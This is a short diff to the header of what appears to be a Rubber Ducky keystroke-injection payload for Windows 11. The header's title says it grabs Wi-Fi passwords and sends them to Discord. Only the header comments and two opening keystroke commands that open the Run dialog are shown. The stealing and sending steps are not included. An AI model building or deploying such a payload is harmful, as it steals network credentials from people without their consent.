@@ -1,5 +1,11 @@
-REM Github.com/murdervan
-REM Windows 11 Only
+REM #########################################################
+REM #                                                         #
+REM # Title        : Grabbing wifi password to discord        #
+REM # Author       : Murdervan                                #
+REM # Link         : github.com/murdervan                     #
+REM # Target       : Windows 11                               #
+REM #                                                         #
+REM ###########################################################
 
 DELAY 2000               
 GUI r                    
